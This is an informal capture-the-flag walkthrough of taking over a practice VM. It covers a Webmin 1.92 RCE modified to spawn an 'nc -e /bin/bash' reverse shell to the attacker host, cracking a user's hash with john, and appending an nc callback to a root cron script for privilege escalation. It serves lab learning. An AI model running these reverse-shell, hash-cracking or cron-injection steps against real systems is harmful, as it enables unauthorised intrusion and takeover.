Ran Nikto + Dirb on 80, didn't give me much 
	nikto -h 192.168.56.124
	dirb http://192.168.56.124/

Let's look at this 13337.
	Going to https://192.168.56.125:13337 directs us to a Webmin login page. Try some basic default logins + sqli but to no avail

searchsploit webmin 1.92
	have an RCE for 1.92

Read the script, see it's just echoing a flag. Let's change this to run a nc command instead to get a reverse shell:
	d=id|nc -e /bin/bash 192.168.56.125 4444 &new

Now start a listener on attacking machine:
	nc -lvp 4444

Run the script and boom, we have a user shell

whoami -> nezuko
ls
cat nezuko.txt -> first flag!!

let's see if we have python at all
python --version -> nada
python3 --verison -> python 3.6.7 yay
python -c 'import pty; pty.spawn("/bin/bash")'
	Now we have a bash shell, much easier to work with

enumerating around nezuko's dir, we see messages being sent from zenitsu. Let's try to become zenitsu

cat /etc/passwd
	Reveals a hash for zenitsu!
	zenitsu:$6$LbPWwHSD$69t89j0Podkdd8dk17jNKt6Dl2.QYwSJGIX0cE5nysr6MX23DFvIAwmxEHOjhBj8rBplVa3rqcVDO0001PY9G0

throw that in a file and run john against it
	john zenitsu.usr
	john --show zenitsu.usr -> gives us zenitsu's password! (meowmeow)

now in our reverse shell, lets change user to zenitsu since we have his password
	su zenitsu
	pw: meowmeow
boom, we're in. second flag in zenitsu.txt! lets run the python script again to get bash.

Ok so now we are zenitsu, but still can't get in admin. Let's enumerate through zenitsu

Find a sh file called send_message_to_nezuko.sh
if we run ll to see privileges of the file, it executes as root. If we inspect the file, we see it's sending a message to nezuku. It seems like its running on a cron job since nezuko is getting a message
every 5 minutes. So, let's append a reverse shell to the file and listen for it, and see after 5 minutes if we get a root shell!

echo "nc 192.168.56.125 5555" >> send_message_to_nezuko.sh

works, vi the sh file to verify. now wait

make sure to start your listener on the attacking machine

then boom, we get the shell, whoami -> root! BOOM.

cat root.txt -> we win :)
pretty weeb overall but eh, still a fun ctf. make sure to apt upgrade! my first searchsploit wasn't updated so didnt have the up to date exploit at first
